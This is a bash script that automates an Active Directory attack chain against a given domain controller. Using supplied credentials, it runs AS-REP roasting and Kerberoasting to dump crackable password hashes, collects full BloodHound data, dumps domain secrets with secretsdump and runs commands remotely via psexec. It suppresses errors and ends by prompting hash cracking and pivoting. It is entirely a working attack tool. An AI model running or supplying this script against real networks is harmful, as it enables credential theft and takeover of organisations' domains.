#!/bin/bash
# AD Kill Chain Automation Script
# Usage: ./ad_path.sh <domain> <username> <password> <dc_ip>

DOMAIN=$1
USER=$2
PASS=$3
DC_IP=$4

if [ -z "$DOMAIN" ] || [ -z "$USER" ] || [ -z "$PASS" ] || [ -z "$DC_IP" ]; then
    echo "Usage: $0 <domain> <username> <password> <dc_ip>"
    exit 1
fi

echo "[*] AD Kill Chain - $DOMAIN"
echo "[*] Target DC: $DC_IP"

# Phase 1: AS-REP Roast
echo "[*] Phase 1: AS-REP Roast"
python -m impacket.examples.GetNPUsers "$DOMAIN/" -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip "$DC_IP" 2>/dev/null

# Phase 2: Kerberoast
echo "[*] Phase 2: Kerberoast"
python -m impacket.examples.GetUserSPNs "$DOMAIN/$USER:$PASS@$DC_IP" -format hashcat -outputfile spn_hashes.txt 2>/dev/null

# Phase 3: BloodHound collection
echo "[*] Phase 3: BloodHound"
bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -c All -ns "$DC_IP" 2>/dev/null

# Phase 4: Secrets dump
echo "[*] Phase 4: Secrets dump"
python -m impacket.examples.secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" 2>/dev/null

# Phase 5: Lateral movement check
echo "[*] Phase 5: Lateral movement"
python -m impacket.examples.psexec "$DOMAIN/$USER:$PASS@$DC_IP" "whoami" 2>/dev/null

echo "[*] AD Kill Chain complete"
echo "[*] Next: crack hashes, analyze BloodHound, pivot"
